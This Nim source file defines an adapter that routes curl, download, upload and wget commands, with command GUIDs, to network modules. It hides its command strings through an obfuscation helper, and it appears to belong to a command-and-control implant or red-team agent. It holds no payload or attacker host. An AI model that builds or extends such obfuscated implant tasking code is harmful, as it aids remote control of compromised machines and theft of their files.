#[
    Adapter: NetworkCommandAdapter
    Wraps network modules (curl, download, upload, wget)
    Implements CommandModulePort to normalize interfaces
    Applies Dependency Inversion Principle
]#

import options
import ../../../domain/models/network_command_context
import ../../modules/network/[curl, download, upload, wget]
from ../string_obfuscation_adapter import obf

type
    NetworkCommandAdapter* = object
        ## Adapter for network command modules
        discard

proc newNetworkCommandAdapter*(): NetworkCommandAdapter =
    ## Create a new NetworkCommandAdapter instance
    result = NetworkCommandAdapter()

proc executeCommand*(adapter: NetworkCommandAdapter, cmd: string, args: seq[string], cmdGuid: string, ctx: Option[NetworkCommandContext]): string =
    ## Execute a network command
    ## Requires NetworkCommandContext - will fail if not provided
    if ctx.isNone:
        return obf("ERROR: Network command requires network context")
    
    let networkCtx = ctx.get()
    
    case cmd:
    of obf("curl"):
        result = curl(networkCtx, args)
    of obf("download"):
        result = download(networkCtx, cmdGuid, args)
    of obf("upload"):
        result = upload(networkCtx, cmdGuid, args)
    of obf("wget"):
        result = wget(networkCtx, args)
    else:
        result = obf("ERROR: Unknown network command: ") & cmd

